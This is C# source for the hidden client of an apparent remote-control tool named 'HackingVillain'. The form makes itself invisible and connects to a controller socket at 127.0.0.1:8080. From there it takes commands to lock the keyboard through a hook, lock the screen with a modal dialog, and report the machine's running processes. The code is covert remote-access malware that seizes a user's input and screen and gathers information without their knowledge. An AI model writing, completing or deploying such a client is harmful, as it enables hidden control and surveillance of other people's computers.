﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AwesomeSockets.Buffers;
using AwesomeSockets.Sockets;
using AwesomeSockets.Domain.Sockets;

using Buffer = AwesomeSockets.Buffers.Buffer;
namespace HackingVillain
{
    public partial class Client : Form
    {
        ISocket _client;
        Hooker _hook;
        ScreenMonitor _monitor;
        LockForm _lock;
        Thread _listen;
        public Client()
        {
            InitializeComponent();
            _client = AweSock.TcpConnect("127.0.0.1", 8080);
            _hook = new Hooker(_client);
            //_monitor = new ScreenMonitor(_client);
            _lock = new LockForm(_hook);

            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                }
            });

            _listen.Start();

            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new System.Drawing.Size(0, 0);
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        ~Client()
        {
            _hook.Dispose();
        }

        public void Send(string msg)
        {
            Buffer b = Buffer.New();
            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
            _client.SendMessage(b);
        }

        void Listen()
        {
            Buffer coming = Buffer.New();
            _client.ReceiveMessage(coming);
            Buffer.FinalizeBuffer(coming);

            string data = Encoding.UTF8.GetString(Buffer.GetBuffer(coming));
            data = data.TrimEnd('\0');
            if(data == "Lock Key")
            {
                _hook.Lock();
            }
            else if(data == "UnLock Key")
            {
                _hook.UnLock();
            }
            else if(data == "Lock Screen")
            {
                _lock.ShowDialog();
            }
            else if(data == "UnLock Screen")
            {
                _lock.Fuck();
            }
            else if(data == "Show Me The Process")
            {
                var processes = from p in Process.GetProcesses()
                                select p.ProcessName;
                Send(string.Join("\n", processes));
            }
        }
    }
}
